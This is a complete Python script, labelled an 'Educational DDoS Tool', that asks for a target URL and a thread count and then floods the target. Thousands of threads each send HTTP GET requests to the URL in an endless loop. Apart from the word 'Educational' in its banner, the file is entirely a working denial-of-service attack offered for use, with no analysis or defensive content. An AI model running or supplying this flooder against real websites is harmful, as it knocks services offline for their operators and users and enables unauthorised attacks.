#!/usr/bin/env python3

import threading
import requests
import random
import time
import os

# Terminal colors
colors = [
    "\033[91m",  # Red
    "\033[92m",  # Green
    "\033[93m",  # Yellow
    "\033[94m",  # Blue
    "\033[95m",  # Magenta
    "\033[96m",  # Cyan
]
reset = "\033[0m"

# Banner
os.system("clear")
print(random.choice(colors) + """
██████  ██ ███    ███ ██████  ███████ 
██   ██ ██ ████  ████ ██   ██ ██      
██████  ██ ██ ████ ██ ██   ██ █████   
██      ██ ██  ██  ██ ██   ██ ██      
██      ██ ██      ██ ██████  ███████ 
        Educational DDoS Tool
            Author: RIMZI
""" + reset)

# Inputs
target = input("🌐 Target URL (with http:// or https://): ").strip()
threads = int(input("🚀 Number of Threads (e.g. 5000 or 10000): "))

# Attack function
def attack():
    while True:
        try:
            res = requests.get(target)
            print(random.choice(colors) + f"[✔] {res.status_code} => {target}" + reset)
        except requests.exceptions.RequestException:
            print(random.choice(colors) + f"[✘] Request Failed => {target}" + reset)

# Launch attack
print(random.choice(colors) + f"\n💥 Launching {threads} threads...\n" + reset)
for i in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

time.sleep(999999)
